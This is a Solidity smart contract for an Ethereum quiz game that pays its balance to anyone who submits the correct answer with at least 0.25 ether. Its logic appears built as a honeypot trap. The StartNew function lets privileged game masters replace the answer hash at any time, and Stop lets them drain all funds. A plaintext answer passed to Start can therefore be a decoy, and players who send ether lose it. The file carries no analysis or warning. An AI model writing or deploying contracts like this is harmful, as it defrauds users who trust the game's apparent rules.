1 pragma solidity ^0.4.24;
2 
3 contract Game
4 {
5     string public question;
6     bytes32 responseHash;
7     mapping(bytes32 => bool) gameMaster;
8 
9     function Guess(string _response) external payable
10     {
11         require(msg.sender == tx.origin);
12         if(responseHash == keccak256(_response) && msg.value >= 0.25 ether)
13         {
14             msg.sender.transfer(this.balance);
15         }
16     }
17 
18     function Start(string _question, string _response) public payable onlyGameMaster {
19         if(responseHash==0x0){
20             responseHash = keccak256(_response);
21             question = _question;
22         }
23     }
24 
25     function Stop() public payable onlyGameMaster {
26         msg.sender.transfer(this.balance);
27     }
28 
29     function StartNew(string _question, bytes32 _responseHash) public payable onlyGameMaster {
30         question = _question;
31         responseHash = _responseHash;
32     }
33 
34     constructor(bytes32[] _gameMasters) public{
35         for(uint256 i=0; i< _gameMasters.length; i++){
36             gameMaster[_gameMasters[i]] = true;        
37         }       
38     }
39 
40     modifier onlyGameMaster(){
41         require(gameMaster[keccak256(msg.sender)]);
42         _;
43     }
44 
45     function() public payable{}
46 }